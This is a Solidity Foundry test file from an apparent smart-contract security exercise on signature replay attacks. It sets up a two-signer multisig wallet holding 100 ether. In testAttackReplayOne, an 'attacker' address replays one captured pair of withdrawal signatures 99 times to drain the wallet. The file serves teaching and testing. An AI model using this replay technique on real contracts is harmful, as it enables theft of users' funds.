// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {MultiSignatureWallet} from "src/replay-attack-1/MultiSignatureWallet.sol";
import {MultiSignatureWalletSecure} from "src/replay-attack-1/MultiSignatureWalletSecure.sol";


/**
@dev run "forge test --match-contract RA1 -vvvvv" 
*/
contract MultiSignatureWalletTest is Test {
    MultiSignatureWalletSecure multiSigWallet;

    address deployer;
    uint256 deployerKey;

    address signer2;
    uint256 signer2Key;

    address attacker = makeAddr("attacker");

    uint256 constant ETH_IN_MULTISIG = 100 ether;
    uint256 constant ATTACKER_WITHDRAW = 1 ether;

    function setUp() public {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
        (deployer, deployerKey) = makeAddrAndKey("deployer");
        (signer2, signer2Key) = makeAddrAndKey("signer2");

        // Deploy multisig
        address[2] memory signatories;
        signatories[0] = deployer;
        signatories[1] = signer2;
        vm.prank(deployer);
        multiSigWallet = new MultiSignatureWalletSecure(signatories);

        // Send ETH to multisig Wallet
        vm.deal(deployer, ETH_IN_MULTISIG);
        vm.prank(deployer);
        (bool success, ) = address(multiSigWallet).call{value: ETH_IN_MULTISIG}("");
        require(success, "Funding Failed!!!");
        assertEq(address(multiSigWallet).balance, ETH_IN_MULTISIG);

        // Prepare withdraw Message
        bytes32 message = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n52", attacker, ATTACKER_WITHDRAW));

        // Sign message
        uint8 v;
        bytes32 r;
        bytes32 s;

        //Deployer signs the message and it is stored in "deployerSignature"
        (v, r, s) = vm.sign(deployerKey, message);
        MultiSignatureWalletSecure.Signature memory deployerSignature = MultiSignatureWalletSecure.Signature(v, r, s);
        

        console.log("Signature 1: ");
        console.log("v: ", v);
        console.log("r: ");
        console.logBytes32(r);
        console.log("s: ");
        console.logBytes32(s);
        
        //signer2 signs the message and it is stored in "signer2Signature"
        (v, r, s) = vm.sign(signer2Key, message);
        MultiSignatureWalletSecure.Signature memory signer2Signature = MultiSignatureWalletSecure.Signature(v, r, s);
        console.log("Signature 2: ");
        console.log("v: ", v);
        console.log("r: ");
        console.logBytes32(r);
        console.log("s: ");
        console.logBytes32(s);

        // Call transfer with signatures
        multiSigWallet.transfer(attacker, ATTACKER_WITHDRAW, [deployerSignature, signer2Signature]);
        assertEq(address(multiSigWallet).balance, ETH_IN_MULTISIG - ATTACKER_WITHDRAW);
    }

    function testAttackReplayOne() public {
        vm.startPrank(attacker);
        uint8 v = 27;
        bytes32 r = bytes32(0x1ddabf42460a80d2780a214aeec06787c1feb8046f4a88662db254e1ea1c15db);
        bytes32 s = bytes32(0x1ddb0931fa6572af9ea5bab4c7afd0779a095beb68a9ca160c8b23647d63f7f9);

        MultiSignatureWalletSecure.Signature memory deployerSignature = MultiSignatureWalletSecure.Signature(v, r, s);

        uint8 v2 = 27;
        bytes32 r2 = bytes32(0xada7024b0ac3b997b1d05eedf4ba6020f1fdc92eaae47c2e9c6ec354ec86b075);
        bytes32 s2 = bytes32(0x541172db522d0cc2ef6c651c8ef67b9f8fb858b394e239d8d1507e58356f787c);

        MultiSignatureWalletSecure.Signature memory signerSignature = MultiSignatureWalletSecure.Signature(v2, r2, s2);

        
        for (uint i = 0; i < 99; i++) {
            multiSigWallet.transfer(attacker, ATTACKER_WITHDRAW, [deployerSignature, signerSignature]);
        }
        assertEq(attacker.balance, ETH_IN_MULTISIG);
        vm.stopPrank();
    }
}